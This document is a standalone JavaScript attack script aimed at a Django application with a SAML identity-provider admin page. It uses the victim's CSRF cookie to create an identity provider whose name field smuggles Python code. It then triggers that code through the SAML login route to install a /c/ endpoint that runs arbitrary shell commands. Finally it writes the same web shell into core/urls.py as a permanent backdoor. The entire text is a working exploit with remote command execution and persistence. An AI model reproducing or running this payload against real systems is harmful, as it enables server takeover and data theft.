(function() {
    function getCookie(n){let b=document.cookie.match('(^|;)\\s*'+n+'\\s*=\\s*([^;]+)');return b?b.pop():''}
    const id = Math.floor(Math.random() * 999);
    const slug = 'web-' + id;

    // STAGE 1: Memory-Patching Payload (Only ~200 characters)
    // - Patches live urlpatterns in core.urls (u)
    // - Clears the URL cache for immediate effect
    // - Fits well within the 255 char limit
    const py = "import os,core.urls as u;from django.urls import*;from django.http import HttpResponse as H;u.urlpatterns.insert(0,re_path('^c/?$',lambda r:H(os.popen(r.GET.get('c')).read())));clear_url_caches()";

    const name = `E${id}\n${py}`;

    const formData = new FormData();
    formData.append('csrfmiddlewaretoken', getCookie('csrftoken'));
    formData.append('name', name);
    formData.append('slug', slug);
    formData.append('protocol', 'saml');
    formData.append('status', 'active');
    formData.append('priority', '0');
    formData.append('use_custom_attribute_map', 'on');
    formData.append('attribute_mapping', '{"email":["mail"]}');
    formData.append('saml_metadata_xml', `<?xml version="1.0"?><md:EntityDescriptor xmlns:md="urn:oasis:names:tc:SAML:2.0:metadata" entityID="https://${id}.com"><md:IDPSSODescriptor
protocolSupportEnumeration="urn:oasis:names:tc:SAML:2.0:protocol"><md:SingleSignOnService Binding="urn:oasis:names:tc:SAML:2.0:bindings:HTTP-Redirect"
Location="https://x.com"/></md:IDPSSODescriptor></md:EntityDescriptor>`);
    formData.append('_save', 'Save');

    console.log("Creating Identity Provider...");
    fetch('/admin/uac/identityprovider/add/', { method: 'POST', body: formData })
    .then(r => {
        if (r.ok) {
            console.log("IDP Created. Triggering Memory Patch...");
            return fetch('/saml2/login/' + slug + '/');
        }
    })
    .then(() => {
        console.log("Memory Patched! Stage 2: Securing Persistence...");

        // STAGE 2: Persistence via the newly created /c/ endpoint
        // Because this is just a URL parameter, there are no length limits
        const persistCmd = `echo "from django.urls import re_path; from django.http import HttpResponse; import os; urlpatterns.insert(0, re_path(r'^c/?$', lambda r:
HttpResponse(os.popen(r.GET.get('c')).read())))" >> core/urls.py`;

        return fetch('/c/?c=' + encodeURIComponent(persistCmd));
    })
    .then(r => {
        if(r.ok) console.log("Done! Permanent backdoor installed at /c/?c=id");
    })
    .catch(e => console.error(e));
})();


